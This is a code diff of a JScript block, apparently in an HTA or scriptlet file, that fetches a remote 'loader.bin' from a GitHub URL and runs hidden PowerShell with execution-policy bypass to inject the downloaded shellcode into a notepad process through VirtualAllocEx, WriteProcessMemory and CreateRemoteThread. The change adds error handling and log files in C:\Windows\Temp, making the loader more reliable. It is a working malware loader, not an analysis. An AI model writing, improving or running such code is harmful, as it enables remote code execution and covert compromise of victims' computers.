@@ -8,48 +8,67 @@
     
     <script language="JScript">
         <![CDATA[
-            var url = "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin";
-            var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-            xhr.open("GET", url, false);
-            xhr.send();
-            
-            if (xhr.status == 200) {
-                var payload = xhr.responseBody;
-                var shellcode = new VBArray(payload).toArray();
+            try {
+                var url = "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin";
+                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+                xhr.open("GET", url, false);
+                xhr.send();
                 
-                var shell = new ActiveXObject("WScript.Shell");
-                var psCode = "";
-                psCode += "$code = [System.Convert]::FromBase64String('" + base64Encode(shellcode) + "');";
-                psCode += "[System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices');";
-                psCode += "Add-Type @'";
-                psCode += "using System;";
-                psCode += "using System.Runtime.InteropServices;";
-                psCode += "using System.Diagnostics;";
-                psCode += "public class Inject {";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);";
-                psCode += "[DllImport(\"kernel32.dll\")]";
-                psCode += "public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);";
-                psCode += "public static void InjectShellcode(byte[] shellcode) {";
-                psCode += "Process[] procs = Process.GetProcessesByName(\"notepad\");";
-                psCode += "if (procs.Length == 0) return;";
-                psCode += "IntPtr hProcess = OpenProcess(0x1F0FFF, false, procs[0].Id);";
-                psCode += "IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);";
-                psCode += "UIntPtr bytesWritten;";
-                psCode += "WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten);";
-                psCode += "CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);";
-                psCode += "}";
-                psCode += "}";
-                psCode += "'@;";
-                psCode += "[Inject]::InjectShellcode($code);";
-                
-                shell.Run("powershell -exec bypass -WindowStyle Hidden -Command \"" + psCode + "\"", 0, false);
+                if (xhr.status == 200) {
+                    var payload = xhr.responseBody;
+                    var shellcode = new VBArray(payload).toArray();
+                    
+                    var shell = new ActiveXObject("WScript.Shell");
+                    var psCode = "";
+                    psCode += "try {";
+                    psCode += "$code = [System.Convert]::FromBase64String('" + base64Encode(shellcode) + "');";
+                    psCode += "Add-Type -TypeDefinition @'\n";
+                    psCode += "using System;\n";
+                    psCode += "using System.Runtime.InteropServices;\n";
+                    psCode += "using System.Diagnostics;\n";
+                    psCode += "public class Inject {\n";
+                    psCode += "[DllImport(\"kernel32.dll\")]\n";
+                    psCode += "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);\n";
+                    psCode += "[DllImport(\"kernel32.dll\")]\n";
+                    psCode += "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n";
+                    psCode += "[DllImport(\"kernel32.dll\")]\n";
+                    psCode += "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);\n";
+                    psCode += "[DllImport(\"kernel32.dll\")]\n";
+                    psCode += "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n";
+                    psCode += "public static void InjectShellcode(byte[] shellcode) {\n";
+                    psCode += "Process[] procs = Process.GetProcessesByName(\"notepad\");\n";
+                    psCode += "if (procs.Length == 0) { WriteToFile(\"Error: No notepad process found\"); return; }\n";
+                    psCode += "IntPtr hProcess = OpenProcess(0x1F0FFF, false, procs[0].Id);\n";
+                    psCode += "if (hProcess == IntPtr.Zero) { WriteToFile(\"Error: Cannot open process\"); return; }\n";
+                    psCode += "IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);\n";
+                    psCode += "if (addr == IntPtr.Zero) { WriteToFile(\"Error: Cannot allocate memory\"); return; }\n";
+                    psCode += "UIntPtr bytesWritten;\n";
+                    psCode += "bool success = WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten);\n";
+                    psCode += "if (!success) { WriteToFile(\"Error: Cannot write memory\"); return; }\n";
+                    psCode += "IntPtr thread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n";
+                    psCode += "if (thread == IntPtr.Zero) { WriteToFile(\"Error: Cannot create thread\"); return; }\n";
+                    psCode += "WriteToFile(\"Success: Shellcode injected\");\n";
+                    psCode += "}\n";
+                    psCode += "public static void WriteToFile(string message) {\n";
+                    psCode += "System.IO.File.WriteAllText(@\"C:\\Windows\\Temp\\inject_log.txt\", $\"[{DateTime.Now}] {message}\");\n";
+                    psCode += "}\n";
+                    psCode += "}\n";
+                    psCode += "'@ -ErrorAction Stop;";
+                    psCode += "[Inject]::InjectShellcode($code);";
+                    psCode += "} catch { [System.IO.File]::WriteAllText(@\"C:\\Windows\\Temp\\inject_error.txt\", $\"PowerShell Error: $_\") }";
+                    
+                    shell.Run("powershell -exec bypass -WindowStyle Hidden -Command \"" + psCode + "\"", 0, false);
+                } else {
+                    var fso = new ActiveXObject("Scripting.FileSystemObject");
+                    var ts = fso.OpenTextFile("C:\\Windows\\Temp\\http_error.txt", 2, true);
+                    ts.WriteLine("HTTP Error: " + xhr.status);
+                    ts.Close();
+                }
+            } catch(e) {
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                var ts = fso.OpenTextFile("C:\\Windows\\Temp\\jscript_error.txt", 2, true);
+                ts.WriteLine("JScript Error: " + e.message);
+                ts.Close();
             }
             
             function base64Encode(data) {
